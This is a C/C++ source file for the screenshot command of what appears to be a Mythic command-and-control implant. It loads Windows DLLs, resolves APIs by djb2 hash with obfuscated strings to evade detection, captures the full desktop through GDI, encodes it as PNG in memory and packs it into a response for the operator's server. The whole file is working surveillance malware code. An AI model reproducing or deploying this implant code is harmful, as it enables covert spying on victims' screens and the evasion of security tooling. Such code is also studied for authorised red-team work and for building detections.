#include "config.h"
#ifdef INCLUDE_CMD_SCREENSHOT

#include "commands.h"
#include "common.h"

// GDI
typedef int     (WINAPI *fn_GetSystemMetrics)(int);
typedef HDC     (WINAPI *fn_GetDC)(HWND);
typedef int     (WINAPI *fn_ReleaseDC)(HWND, HDC);
typedef HDC     (WINAPI *fn_CreateCompatibleDC)(HDC);
typedef HBITMAP (WINAPI *fn_CreateCompatibleBitmap)(HDC, int, int);
typedef HGDIOBJ (WINAPI *fn_SelectObject)(HDC, HGDIOBJ);
typedef BOOL    (WINAPI *fn_BitBlt)(HDC, int, int, int, int, HDC, int, int, DWORD);
typedef int     (WINAPI *fn_GetDIBits)(HDC, HBITMAP, UINT, UINT, LPVOID, LPBITMAPINFO, UINT);
typedef BOOL    (WINAPI *fn_DeleteObject)(HGDIOBJ);
typedef BOOL    (WINAPI *fn_DeleteDC)(HDC);

// GDI+ flat API (opaque types)
struct GpBitmap;
struct GpImage;

struct GdiplusStartupInput {
    UINT32 GdiplusVersion;
    void*  DebugEventCallback;
    BOOL   SuppressBackgroundThread;
    BOOL   SuppressExternalCodecs;
};

typedef int    (WINAPI *fn_GdiplusStartup)(ULONG_PTR*, const GdiplusStartupInput*, void*);
typedef void   (WINAPI *fn_GdiplusShutdown)(ULONG_PTR);
typedef int    (WINAPI *fn_GdipCreateBitmapFromGdiDib)(const BITMAPINFO*, void*, GpBitmap**);
typedef int    (WINAPI *fn_GdipSaveImageToStream)(GpImage*, IUnknown*, const GUID*, const void*);
typedef int    (WINAPI *fn_GdipDisposeImage)(GpImage*);

typedef HRESULT (WINAPI *fn_CreateStreamOnHGlobal)(HGLOBAL, BOOL, IUnknown**);
typedef HRESULT (WINAPI *fn_GetHGlobalFromStream)(IUnknown*, HGLOBAL*);

typedef SIZE_T (WINAPI *fn_GlobalSize)(HGLOBAL);
typedef LPVOID (WINAPI *fn_GlobalLock)(HGLOBAL);
typedef BOOL   (WINAPI *fn_GlobalUnlock)(HGLOBAL);

#define SM_CXSCREEN 0
#define SM_CYSCREEN 1
#define SRCCOPY     0x00CC0020

// {557CF406-1A04-11D3-9A73-0000F81EF32E} - built-in PNG encoder
static const GUID png_encoder_clsid = {
    0x557CF406, 0x1A04, 0x11D3,
    { 0x9A, 0x73, 0x00, 0x00, 0xF8, 0x1E, 0xF3, 0x2E }
};

static void* _vtcall(void* obj, int index) {
    void** vtbl = *(void***)obj;
    return vtbl[index];
}

// Response format: "ESPNG:" magic followed by the PNG bytes. The translator
// detects the magic in TLV_OUTPUT and converts it to a single-chunk Mythic
// download (is_screenshot) - Mythic registers the file server-side, no
// pre-arranged file_id needed.
static const char SHOT_MAGIC[] = "ESPNG:";

VOID cmd_screenshot(PINSTANCE inst, PPARSER args, PPACKAGE response) {
    (void)args;

    DBG(inst, "[ES] cmd_screenshot");

    xstr(_user32,  "user32.dll");
    xstr(_gdi32,   "gdi32.dll");
    xstr(_gdiplus, "gdiplus.dll");
    xstr(_ole32,   "ole32.dll");
    xstr(_combase, "combase.dll");

    HMODULE h_user32  = inst->Win32.LoadLibraryA(_user32);
    HMODULE h_gdi32   = inst->Win32.LoadLibraryA(_gdi32);
    HMODULE h_gdiplus = inst->Win32.LoadLibraryA(_gdiplus);
    HMODULE h_ole32   = inst->Win32.LoadLibraryA(_ole32);
    // combase first: ole32 exports CreateStreamOnHGlobal as a forwarder, and
    // resolving a forwarded export returns the forwarder string, not code.
    HMODULE h_combase = inst->Win32.LoadLibraryA(_combase);

    if (!h_user32 || !h_gdi32 || !h_gdiplus || !h_ole32) {
        package_add_string(inst, response, XSTR("failed to load user32/gdi32/gdiplus/ole32"));
        response->is_error = TRUE;
        return;
    }

    fn_GetSystemMetrics         pGetSystemMetrics = (fn_GetSystemMetrics)resolve_function((PVOID)h_user32, hash_string_djb2(XSTR("GetSystemMetrics")));
    fn_GetDC                    pGetDC = (fn_GetDC)resolve_function((PVOID)h_user32, hash_string_djb2(XSTR("GetDC")));
    fn_ReleaseDC                pReleaseDC = (fn_ReleaseDC)resolve_function((PVOID)h_user32, hash_string_djb2(XSTR("ReleaseDC")));
    fn_CreateCompatibleDC       pCreateCompatibleDC = (fn_CreateCompatibleDC)resolve_function((PVOID)h_gdi32, hash_string_djb2(XSTR("CreateCompatibleDC")));
    fn_CreateCompatibleBitmap   pCreateCompatibleBitmap = (fn_CreateCompatibleBitmap)resolve_function((PVOID)h_gdi32, hash_string_djb2(XSTR("CreateCompatibleBitmap")));
    fn_SelectObject             pSelectObject = (fn_SelectObject)resolve_function((PVOID)h_gdi32, hash_string_djb2(XSTR("SelectObject")));
    fn_BitBlt                   pBitBlt = (fn_BitBlt)resolve_function((PVOID)h_gdi32, hash_string_djb2(XSTR("BitBlt")));
    fn_GetDIBits                pGetDIBits = (fn_GetDIBits)resolve_function((PVOID)h_gdi32, hash_string_djb2(XSTR("GetDIBits")));
    fn_DeleteObject             pDeleteObject = (fn_DeleteObject)resolve_function((PVOID)h_gdi32, hash_string_djb2(XSTR("DeleteObject")));
    fn_DeleteDC                 pDeleteDC = (fn_DeleteDC)resolve_function((PVOID)h_gdi32, hash_string_djb2(XSTR("DeleteDC")));

    fn_GdiplusStartup             pGdiplusStartup = (fn_GdiplusStartup)resolve_function((PVOID)h_gdiplus, hash_string_djb2(XSTR("GdiplusStartup")));
    fn_GdiplusShutdown            pGdiplusShutdown = (fn_GdiplusShutdown)resolve_function((PVOID)h_gdiplus, hash_string_djb2(XSTR("GdiplusShutdown")));
    fn_GdipCreateBitmapFromGdiDib pGdipCreateBitmapFromGdiDib = (fn_GdipCreateBitmapFromGdiDib)resolve_function((PVOID)h_gdiplus, hash_string_djb2(XSTR("GdipCreateBitmapFromGdiDib")));
    fn_GdipSaveImageToStream      pGdipSaveImageToStream = (fn_GdipSaveImageToStream)resolve_function((PVOID)h_gdiplus, hash_string_djb2(XSTR("GdipSaveImageToStream")));
    fn_GdipDisposeImage           pGdipDisposeImage = (fn_GdipDisposeImage)resolve_function((PVOID)h_gdiplus, hash_string_djb2(XSTR("GdipDisposeImage")));

    fn_CreateStreamOnHGlobal pCreateStreamOnHGlobal = nullptr;
    fn_GetHGlobalFromStream  pGetHGlobalFromStream = nullptr;
    if (h_combase) {
        pCreateStreamOnHGlobal = (fn_CreateStreamOnHGlobal)resolve_function((PVOID)h_combase, hash_string_djb2(XSTR("CreateStreamOnHGlobal")));
        pGetHGlobalFromStream = (fn_GetHGlobalFromStream)resolve_function((PVOID)h_combase, hash_string_djb2(XSTR("GetHGlobalFromStream")));
    }
    if (!pCreateStreamOnHGlobal)
        pCreateStreamOnHGlobal = (fn_CreateStreamOnHGlobal)resolve_function((PVOID)h_ole32, hash_string_djb2(XSTR("CreateStreamOnHGlobal")));
    if (!pGetHGlobalFromStream)
        pGetHGlobalFromStream = (fn_GetHGlobalFromStream)resolve_function((PVOID)h_ole32, hash_string_djb2(XSTR("GetHGlobalFromStream")));

    fn_GlobalSize   pGlobalSize = (fn_GlobalSize)resolve_function(inst->Modules.Kernel32, hash_string_djb2(XSTR("GlobalSize")));
    fn_GlobalLock   pGlobalLock = (fn_GlobalLock)resolve_function(inst->Modules.Kernel32, hash_string_djb2(XSTR("GlobalLock")));
    fn_GlobalUnlock pGlobalUnlock = (fn_GlobalUnlock)resolve_function(inst->Modules.Kernel32, hash_string_djb2(XSTR("GlobalUnlock")));

    const char* miss = nullptr;
    if      (!pGetSystemMetrics)           miss = XSTR("GetSystemMetrics");
    else if (!pGetDC)                      miss = XSTR("GetDC");
    else if (!pReleaseDC)                  miss = XSTR("ReleaseDC");
    else if (!pCreateCompatibleDC)         miss = XSTR("CreateCompatibleDC");
    else if (!pCreateCompatibleBitmap)     miss = XSTR("CreateCompatibleBitmap");
    else if (!pSelectObject)               miss = XSTR("SelectObject");
    else if (!pBitBlt)                     miss = XSTR("BitBlt");
    else if (!pGetDIBits)                  miss = XSTR("GetDIBits");
    else if (!pDeleteObject)               miss = XSTR("DeleteObject");
    else if (!pDeleteDC)                   miss = XSTR("DeleteDC");
    else if (!pGdiplusStartup)             miss = XSTR("GdiplusStartup");
    else if (!pGdipCreateBitmapFromGdiDib) miss = XSTR("GdipCreateBitmapFromGdiDib");
    else if (!pGdipSaveImageToStream)      miss = XSTR("GdipSaveImageToStream");
    else if (!pGdipDisposeImage)           miss = XSTR("GdipDisposeImage");
    else if (!pCreateStreamOnHGlobal)      miss = XSTR("CreateStreamOnHGlobal");
    else if (!pGetHGlobalFromStream)       miss = XSTR("GetHGlobalFromStream");
    else if (!pGlobalSize)                 miss = XSTR("GlobalSize");
    else if (!pGlobalLock)                 miss = XSTR("GlobalLock");
    else if (!pGlobalUnlock)               miss = XSTR("GlobalUnlock");

    if (miss) {
        char err[96] = { 0 };
        const char* prefix = XSTR("API resolve failed: ");
        int ei = 0;
        for (; prefix[ei] && ei < 70; ei++) err[ei] = prefix[ei];
        for (int j = 0; miss[j] && ei < 94; j++, ei++) err[ei] = miss[j];
        err[ei] = '\0';
        package_add_string(inst, response, err);
        response->is_error = TRUE;
        return;
    }

    int width  = pGetSystemMetrics(SM_CXSCREEN);
    int height = pGetSystemMetrics(SM_CYSCREEN);
    if (width <= 0 || height <= 0) {
        package_add_string(inst, response, XSTR("no interactive desktop available"));
        response->is_error = TRUE;
        return;
    }

    HDC h_screen = pGetDC(nullptr);
    HDC h_mem = pCreateCompatibleDC(h_screen);
    HBITMAP h_bmp = pCreateCompatibleBitmap(h_screen, width, height);
    if (!h_screen || !h_mem || !h_bmp) {
        if (h_bmp) pDeleteObject(h_bmp);
        if (h_mem) pDeleteDC(h_mem);
        if (h_screen) pReleaseDC(nullptr, h_screen);
        package_add_string(inst, response, XSTR("GDI capture setup failed"));
        response->is_error = TRUE;
        return;
    }

    pSelectObject(h_mem, h_bmp);
    pBitBlt(h_mem, 0, 0, width, height, h_screen, 0, 0, SRCCOPY);

    // 24bpp bottom-up DIB, DWORD-aligned rows
    DWORD row_stride = ((width * 3 + 3) & ~3);
    DWORD pixel_size = row_stride * height;

    BYTE* pixel_buf = (BYTE*)es_malloc(inst, pixel_size);
    if (!pixel_buf) {
        pDeleteObject(h_bmp);
        pDeleteDC(h_mem);
        pReleaseDC(nullptr, h_screen);
        package_add_string(inst, response, XSTR("alloc failed"));
        response->is_error = TRUE;
        return;
    }

    BITMAPINFOHEADER bi;
    es_memset(&bi, 0, sizeof(bi));
    bi.biSize        = sizeof(BITMAPINFOHEADER);
    bi.biWidth       = width;
    bi.biHeight      = height;
    bi.biPlanes      = 1;
    bi.biBitCount    = 24;
    bi.biCompression = BI_RGB;
    bi.biSizeImage   = pixel_size;

    pGetDIBits(h_mem, h_bmp, 0, height, pixel_buf, (LPBITMAPINFO)&bi, DIB_RGB_COLORS);

    pDeleteObject(h_bmp);
    pDeleteDC(h_mem);
    pReleaseDC(nullptr, h_screen);

    ULONG_PTR gdip_token = 0;
    GdiplusStartupInput startup_in;
    es_memset(&startup_in, 0, sizeof(startup_in));
    startup_in.GdiplusVersion = 1;
    if (pGdiplusStartup(&gdip_token, &startup_in, nullptr) != 0) {
        es_free(inst, pixel_buf);
        package_add_string(inst, response, XSTR("GdiplusStartup failed"));
        response->is_error = TRUE;
        return;
    }

    GpBitmap* gp_bmp = nullptr;
    if (pGdipCreateBitmapFromGdiDib((const BITMAPINFO*)&bi, pixel_buf, &gp_bmp) != 0 || !gp_bmp) {
        es_free(inst, pixel_buf);
        pGdiplusShutdown(gdip_token);
        package_add_string(inst, response, XSTR("GdipCreateBitmapFromGdiDib failed"));
        response->is_error = TRUE;
        return;
    }

    IUnknown* p_stream = nullptr;
    if (pCreateStreamOnHGlobal(nullptr, TRUE, &p_stream) != S_OK || !p_stream) {
        pGdipDisposeImage((GpImage*)gp_bmp);
        es_free(inst, pixel_buf);
        pGdiplusShutdown(gdip_token);
        package_add_string(inst, response, XSTR("CreateStreamOnHGlobal failed"));
        response->is_error = TRUE;
        return;
    }

    if (pGdipSaveImageToStream((GpImage*)gp_bmp, p_stream, &png_encoder_clsid, nullptr) != 0) {
        typedef HRESULT (WINAPI *fn_Release)(IUnknown*);
        ((fn_Release)_vtcall(p_stream, 2))(p_stream);
        pGdipDisposeImage((GpImage*)gp_bmp);
        es_free(inst, pixel_buf);
        pGdiplusShutdown(gdip_token);
        package_add_string(inst, response, XSTR("GdipSaveImageToStream failed"));
        response->is_error = TRUE;
        return;
    }

    HGLOBAL h_glob = nullptr;
    if (pGetHGlobalFromStream(p_stream, &h_glob) != S_OK || !h_glob) {
        typedef HRESULT (WINAPI *fn_Release)(IUnknown*);
        ((fn_Release)_vtcall(p_stream, 2))(p_stream);
        pGdipDisposeImage((GpImage*)gp_bmp);
        es_free(inst, pixel_buf);
        pGdiplusShutdown(gdip_token);
        package_add_string(inst, response, XSTR("GetHGlobalFromStream failed"));
        response->is_error = TRUE;
        return;
    }

    SIZE_T png_size = pGlobalSize(h_glob);
    BYTE* src_ptr = (BYTE*)pGlobalLock(h_glob);

    if (!src_ptr || png_size == 0) {
        if (src_ptr) pGlobalUnlock(h_glob);
        typedef HRESULT (WINAPI *fn_Release)(IUnknown*);
        ((fn_Release)_vtcall(p_stream, 2))(p_stream);
        pGdipDisposeImage((GpImage*)gp_bmp);
        es_free(inst, pixel_buf);
        pGdiplusShutdown(gdip_token);
        package_add_string(inst, response, XSTR("empty PNG stream"));
        response->is_error = TRUE;
        return;
    }

    // magic + PNG into the response
    package_add_bytes(inst, response, (const BYTE*)SHOT_MAGIC, 6);
    package_add_bytes(inst, response, src_ptr, (DWORD)png_size);

    pGlobalUnlock(h_glob);
    typedef HRESULT (WINAPI *fn_Release)(IUnknown*);
    ((fn_Release)_vtcall(p_stream, 2))(p_stream);
    pGdipDisposeImage((GpImage*)gp_bmp);
    es_free(inst, pixel_buf);
    pGdiplusShutdown(gdip_token);

    DBG(inst, "[ES] screenshot captured");
}

#endif
